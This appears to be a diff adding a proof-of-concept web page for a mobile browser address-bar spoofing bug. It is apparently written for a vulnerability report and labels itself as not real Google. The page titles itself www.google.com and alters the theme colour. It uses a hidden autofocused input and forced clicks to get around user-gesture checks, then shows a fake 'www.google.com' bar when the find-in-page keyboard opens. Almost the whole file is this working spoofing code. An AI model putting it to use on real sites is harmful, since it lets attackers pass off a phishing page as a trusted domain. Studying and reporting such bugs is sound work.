@@ -1,46 +1,179 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<title>www.google.com</title>
 
-<html style=""><head></head>
+<meta name="theme-color" content="#f1f3f4" id="themeColor">
 
-<body onload="myFunction()">
-<div >
+<style>
+* { box-sizing: border-box; }
 
-<input autofocus="autofocus" id="x" autocomplete="email" style="margin-top: 8%;
-width: 100px;
-margin-left: 70%">
-
-  </body>
-  </html>
-  
-  
-  
-  
- </html>
- 
- <script>
- setTimeout(fcs,100);
- 
- function fcs()
- {
-   document.getElementById("x").focus();
- }
-
-
-document.addEventListener("click", myFunction);
- 
-function myFunction()
-{
-document.getElementById("x").click();
-
+body {
+  margin: 0;
+  font-family: system-ui, -apple-system, Roboto, Arial, sans-serif;
+  background: #0f0f0f;
+  color: #eaeaea;
+  min-height: 200vh;
+  padding: 24px;
 }
 
+h1 {
+  font-weight: 400;
+}
 
- function spoof(){
- 
-  document.getElementById("x").click();
- 
- }
- 
- 
- 
- </script>
+.fake-bar {
+  position: fixed;
+  left: 0;
+  width: 100%;
+  background: #121212;
+  border-top: 1px solid #303134;
+  text-align: center;
+  padding: 8px 0;
+  font-size: 14px;
+  color: #eaeaea;
+  z-index: 9999;
+
+  bottom: 0;
+  opacity: 0;
+  visibility: hidden;
+
+  transition:
+    opacity .25s ease,
+    visibility .25s ease,
+    bottom .2s ease;
+}
+
+.fake-bar.show {
+  opacity: 1;
+  visibility: visible;
+}
+
+.debug {
+  margin-top: 24px;
+  font-size: 13px;
+  color: #9aa0a6;
+  line-height: 1.6;
+}
+
+/* hidden input */
+#x {
+  position: fixed;
+  opacity: 0;
+  pointer-events: none;
+}
+</style>
+</head>
+
+<body>
+
+<h1>address spoof when find in pages search</h1>
+<p>this is not rill <b>google</b></p>
+
+<div class="debug" id="debug"></div>
+
+<!-- hidden input for user-gesture heuristic -->
+<input id="x" autocomplete="email" autofocus>
+
+<div class="fake-bar" id="fakeBar">
+  www.google.com
+</div>
+
+<script>
+const fakeBar = document.getElementById("fakeBar");
+const debug = document.getElementById("debug");
+const themeColor = document.getElementById("themeColor");
+const input = document.getElementById("x");
+
+let lastViewportHeight = window.innerHeight;
+let lastScrollY = window.scrollY;
+let lastInputTime = 0;
+let active = false;
+
+/* ================= HELPERS ================= */
+
+function setTheme(color) {
+  themeColor.setAttribute("content", color);
+}
+
+function showBar(bottomPx) {
+  if (active) return;
+  active = true;
+  setTheme("#ffffff");
+  fakeBar.style.bottom = bottomPx + "px";
+  fakeBar.classList.add("show");
+}
+
+function hideBar() {
+  active = false;
+  fakeBar.classList.remove("show");
+  fakeBar.style.bottom = "0px";
+  setTheme("#f1f3f4");
+}
+
+/* ================= USER GESTURE TRICK ================= */
+
+/* delayed focus */
+setTimeout(() => {
+  input.focus();
+}, 100);
+
+/* click listener */
+document.addEventListener("click", () => {
+  input.focus();
+  input.click();
+});
+
+/* typing tracker */
+document.addEventListener("input", () => {
+  lastInputTime = Date.now();
+});
+
+/* scroll tracker */
+window.addEventListener("scroll", () => {
+  lastScrollY = window.scrollY;
+});
+
+/* ================= CORE HEURISTIC ================= */
+
+if (window.visualViewport) {
+  window.visualViewport.addEventListener("resize", () => {
+    const vv = window.visualViewport;
+    const heightDiff = lastViewportHeight - vv.height;
+    const keyboardLike = heightDiff > 120;
+    const now = Date.now();
+
+    const focusedEl = document.activeElement;
+    const hasFocusedInput =
+      focusedEl &&
+      (focusedEl.tagName === "INPUT" ||
+       focusedEl.tagName === "TEXTAREA" ||
+       focusedEl.isContentEditable);
+
+    const recentlyTyped = now - lastInputTime < 800;
+    const scrollMoved = Math.abs(window.scrollY - lastScrollY) > 40;
+
+    if (
+      keyboardLike &&
+      !hasFocusedInput &&
+      !recentlyTyped &&
+      !scrollMoved
+    ) {
+      const bottomOffset = window.innerHeight - vv.height;
+      showBar(bottomOffset);
+    } else {
+      hideBar();
+    }
+
+    lastViewportHeight = vv.height;
+  });
+}
+
+/* orientation reset */
+window.addEventListener("orientationchange", hideBar);
+</script>
+
+</body>
+</html>
